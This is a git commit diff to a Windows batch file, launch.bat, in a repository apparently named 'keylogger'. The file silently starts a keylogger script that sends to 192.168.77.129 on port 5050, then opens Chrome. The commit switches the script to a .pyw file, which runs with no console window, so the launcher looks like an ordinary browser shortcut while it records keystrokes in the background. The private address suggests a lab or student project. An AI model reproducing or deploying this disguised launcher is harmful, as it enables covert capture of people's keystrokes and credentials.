033a061103871eec4a099ad4737b3aed41c446e5
Liana Perry <62174756+lperry022@users.noreply.github.com>
2025-08-15 20:18:38 -0700

    Updating the bat file to work

--- launch.bat
+++ launch.bat
@@ -1,3 +1,3 @@
 @echo off
-start "" "C:\Users\windows-warden\Documents\GitHub\keylogger\keylogger.py" 192.168.77.129 5050
-start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
+start "" "C:\Users\windows-warden\Documents\GitHub\keylogger\modules\keylogger.pyw" 192.168.77.129 5050
+start "" /b "C:\Program Files\Google\Chrome\Application\chrome.exe"
